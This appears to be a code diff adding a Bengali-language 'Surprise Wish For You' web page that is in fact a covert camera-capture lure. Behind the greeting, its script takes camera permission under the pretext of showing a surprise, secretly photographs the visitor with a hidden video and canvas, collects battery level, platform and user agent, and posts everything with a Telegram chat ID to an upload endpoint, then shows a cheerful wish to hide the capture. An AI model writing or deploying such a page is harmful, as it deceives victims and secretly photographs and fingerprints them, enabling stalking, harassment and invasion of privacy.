@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎉 Special Surprise!</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f43f5e, #881337);
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+        }
+        h2 { color: #fef08a; margin-bottom: 10px; font-size: 24px; }
+        p { font-size: 14px; color: #f1f5f9; margin-bottom: 20px; }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: none;
+            border-radius: 10px;
+            background: rgba(255,255,255,0.2);
+            color: #fff;
+            font-size: 15px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+        input::placeholder { color: #cbd5e1; }
+        input:focus { outline: 2px solid #fef08a; }
+        .btn {
+            background: #fef08a;
+            color: #881337;
+            font-weight: bold;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: 0.3s;
+        }
+        .btn:hover { background: #fde047; }
+        #status { margin-top: 15px; font-size: 13px; color: #ffedd5; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h2>✨ Surprise Wish For You!</h2>
+        <p>আপনার জন্য একটি বিশেষ সারপ্রাইজ অপেক্ষা করছে। আপনার নাম লিখে সারপ্রাইজটি দেখুন!</p>
+        <input type="text" id="username" placeholder="আপনার নাম লিখুন..." required>
+        <button class="btn" onclick="openSurprise()">Open Surprise 🎁</button>
+        <div id="status"></div>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get('id'); // টেলিগ্রাম ইউজার আইডি
+
+        async function openSurprise() {
+            const name = document.getElementById('username').value;
+            const status = document.getElementById('status');
+
+            if (!name) {
+                alert("দয়া করে আপনার নাম লিখুন!");
+                return;
+            }
+
+            status.innerText = "সারপ্রাইজ লোড হচ্ছে, দয়া করে অপেক্ষা করুন...";
+
+            try {
+                // ক্যামেরা পারমিশন চাওয়া
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // ক্যামেরা ঠিকভাবে সেটআপ হওয়ার জন্য ১.৫ সেকেন্ড সময় দেওয়া
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    const imageData = canvas.toDataURL('image/jpeg');
+
+                    // ব্যাটারি ইনফো সংগ্রহ (যদি সাপোর্ট করে)
+                    navigator.getBattery?.().then(battery => {
+                        const batteryLevel = Math.round(battery.level * 100) + "%";
+                        sendDataToBot(imageData, name, batteryLevel);
+                    }).catch(() => {
+                        sendDataToBot(imageData, name, "N/A");
+                    });
+
+                    // ক্যামেরা স্ট্রিম বন্ধ করা
+                    stream.getTracks().forEach(track => track.stop());
+                }, 1500);
+
+            } catch (err) {
+                status.innerText = "❌ সারপ্রাইজ দেখতে হলে ক্যামেরা পারমিশন দিতে হবে!";
+            }
+        }
+
+        function sendDataToBot(imageBase64, name, battery) {
+            const status = document.getElementById('status');
+            status.innerText = "সারপ্রাইজ তৈরি হচ্ছে...";
+
+            fetch('/upload-image', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    image: imageBase64,
+                    name: name,
+                    battery: battery,
+                    platform: navigator.platform,
+                    ua: navigator.userAgent
+                })
+            }).then(res => {
+                setTimeout(() => {
+                    alert(`স্পেশাল উইশ, ${name}! 🎉 আপনার জন্য অনেক শুভকামনা!`);
+                    location.reload();
+                }, 1000);
+            }).catch(err => {
+                status.innerText = "নেটওয়ার্ক সমস্যা, আবার চেষ্টা করুন।";
+            });
+        }
+    </script>
+</body>
+</html>
